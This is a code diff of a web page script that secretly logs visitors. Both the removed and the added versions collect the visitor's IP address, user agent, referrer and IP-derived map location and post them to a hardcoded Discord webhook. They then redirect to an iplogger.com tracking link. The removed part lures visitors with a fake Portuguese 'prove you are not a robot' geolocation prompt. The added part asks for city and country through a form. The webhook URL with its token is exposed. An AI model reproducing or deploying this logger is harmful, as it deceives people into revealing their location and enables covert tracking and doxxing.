@@ -28,112 +28,71 @@
             const ipLongitude = ipLocationData.lon;
             const ipLocationLink = `https://www.google.com/maps?q=${ipLatitude},${ipLongitude}`;
 
-            // Display message and request geolocation
-            document.getElementById("message").textContent = "Estamos esperando-lhe aceitar a localização para provar-mos que não é um robô";
-
-            if ("geolocation" in navigator) {
-                console.log("Geolocation is available");
-                navigator.geolocation.getCurrentPosition(async (position) => {
-                    const { latitude, longitude } = position.coords;
-                    locationLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
-                    console.log(`User location: ${latitude}, ${longitude}`);
-
-                    const logMessage = {
-                        content: "@everyone",
-                        username: "Logger",
-                        embeds: [{
-                            title: "Visitor Log",
-                            color: 15158332,
-                            fields: [
-                                { name: "User Agent", value: userAgent, inline: false },
-                                { name: "IP Address", value: ipAddress, inline: false },
-                                { name: "Referrer", value: referrer, inline: false },
-                                { name: "Timestamp", value: timestamp, inline: false },
-                                { name: "City (IP)", value: city, inline: false },
-                                { name: "Country (IP)", value: country, inline: false },
-                                { name: "Approximate Location (IP)", value: ipLocationLink, inline: false },
-                                { name: "Accurate Location (User)", value: locationLink, inline: false }
-                            ]
-                        }]
-                    };
-
-                    await fetch(webhookUrl, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json'
-                        },
-                        body: JSON.stringify(logMessage)
-                    });
-
-                    window.location.href = "https://iplogger.com/2lY8J3";
-                }, async (error) => {
-                    console.error("Geolocation error:", error);
-                    const logMessage = {
-                        content: "@everyone",
-                        username: "Logger",
-                        embeds: [{
-                            title: "Visitor Log",
-                            color: 15158332,
-                            fields: [
-                                { name: "User Agent", value: userAgent, inline: false },
-                                { name: "IP Address", value: ipAddress, inline: false },
-                                { name: "Referrer", value: referrer, inline: false },
-                                { name: "Timestamp", value: timestamp, inline: false },
-                                { name: "City (IP)", value: city, inline: false },
-                                { name: "Country (IP)", value: country, inline: false },
-                                { name: "Approximate Location (IP)", value: ipLocationLink, inline: false },
-                                { name: "Accurate Location (User)", value: "Denied", inline: false }
-                            ]
-                        }]
-                    };
-
-                    await fetch(webhookUrl, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json'
-                        },
-                        body: JSON.stringify(logMessage)
-                    });
-
-                    window.location.href = "https://iplogger.com/2lY8J3";
-                });
-            } else {
-                console.error("Geolocation is not available");
-                const logMessage = {
-                    content: "@everyone",
-                    username: "Logger",
-                    embeds: [{
-                        title: "Visitor Log",
-                        color: 15158332,
-                        fields: [
-                            { name: "User Agent", value: userAgent, inline: false },
-                            { name: "IP Address", value: ipAddress, inline: false },
-                            { name: "Referrer", value: referrer, inline: false },
-                            { name: "Timestamp", value: timestamp, inline: false },
-                            { name: "City (IP)", value: city, inline: false },
-                            { name: "Country (IP)", value: country, inline: false },
-                            { name: "Approximate Location (IP)", value: ipLocationLink, inline: false },
-                            { name: "Accurate Location (User)", value: "Not available", inline: false }
-                        ]
-                    }]
-                };
-
-                await fetch(webhookUrl, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify(logMessage)
-                });
-
-                window.location.href = "https://iplogger.com/2lY8J3";
-            }
+            // Display form to ask for user's location
+            document.getElementById("location-form").style.display = "block";
         }
 
-        window.onload = logAndRedirect;
+        async function submitLocation() {
+            const webhookUrl = "https://discord.com/api/webhooks/1256806087521341492/bXa1GxUTO67hu5AZVsIBQeFBn_x_onurU_aVEdmqRHvHNf2zKg2uy7TcYjtSl53yz_5g";
+            const userAgent = navigator.userAgent;
+            const referrer = document.referrer || "No referrer";
+            const timestamp = new Date().toISOString();
+            let locationLink = "N/A";
+            let city = document.getElementById("city").value;
+            let country = document.getElementById("country").value;
+
+            // Get public IP address
+            const ipResponse = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipResponse.json();
+            const ipAddress = ipData.ip;
+
+            // Get approximate location based on IP
+            const ipLocationResponse = await fetch(`http://ip-api.com/json/${ipAddress}`);
+            const ipLocationData = await ipLocationResponse.json();
+            const ipLatitude = ipLocationData.lat;
+            const ipLongitude = ipLocationData.lon;
+            const ipLocationLink = `https://www.google.com/maps?q=${ipLatitude},${ipLongitude}`;
+
+            const logMessage = {
+                content: "@everyone",
+                username: "Logger",
+                embeds: [{
+                    title: "Visitor Log",
+                    color: 15158332,
+                    fields: [
+                        { name: "User Agent", value: userAgent, inline: false },
+                        { name: "IP Address", value: ipAddress, inline: false },
+                        { name: "Referrer", value: referrer, inline: false },
+                        { name: "Timestamp", value: timestamp, inline: false },
+                        { name: "City", value: city, inline: false },
+                        { name: "Country", value: country, inline: false },
+                        { name: "Approximate Location (IP)", value: ipLocationLink, inline: false }
+                    ]
+                }]
+            };
+
+            await fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(logMessage)
+            });
+
+            window.location.href = "https://iplogger.com/2lY8J3";
+        }
     </script>
 </head>
-<body>
-    <p id="message">Estamos esperando-lhe aceitar a localização para provar-mos que não é um robô</p>
+<body onload="logAndRedirect()">
+    <div id="location-form" style="display: none;">
+        <h2>Por favor, informe a sua localização:</h2>
+        <form onsubmit="submitLocation(); return false;">
+            <label for="city">Cidade:</label>
+            <input type="text" id="city" name="city" required><br><br>
+            <label for="country">País:</label>
+            <input type="text" id="country" name="country" required><br><br>
+            <button type="submit">Enviar</button>
+        </form>
+    </div>
 </body>
 </html>
